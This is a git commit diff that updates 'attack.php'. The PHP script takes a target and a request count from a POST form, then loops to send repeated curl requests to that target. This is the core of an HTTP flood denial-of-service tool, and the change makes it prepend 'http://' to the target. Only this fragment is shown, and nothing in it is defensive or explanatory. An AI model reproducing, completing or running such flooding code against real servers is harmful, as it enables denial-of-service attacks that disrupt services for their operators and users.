a7ec0d47b7ea5d35e1473e4b2855435cca14d472
unix-cmd <rktemme@gmail.com>
2025-04-10 16:45:06 +0200

    Update attack.php

--- attack.php
+++ attack.php
@@ -5,7 +5,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     
     for ($i = 0; $i < $requests; $i++) {
         $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $target);
+        curl_setopt($ch, CURLOPT_URL, "http://" . $target);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         $output = curl_exec($ch);
         curl_close($ch);
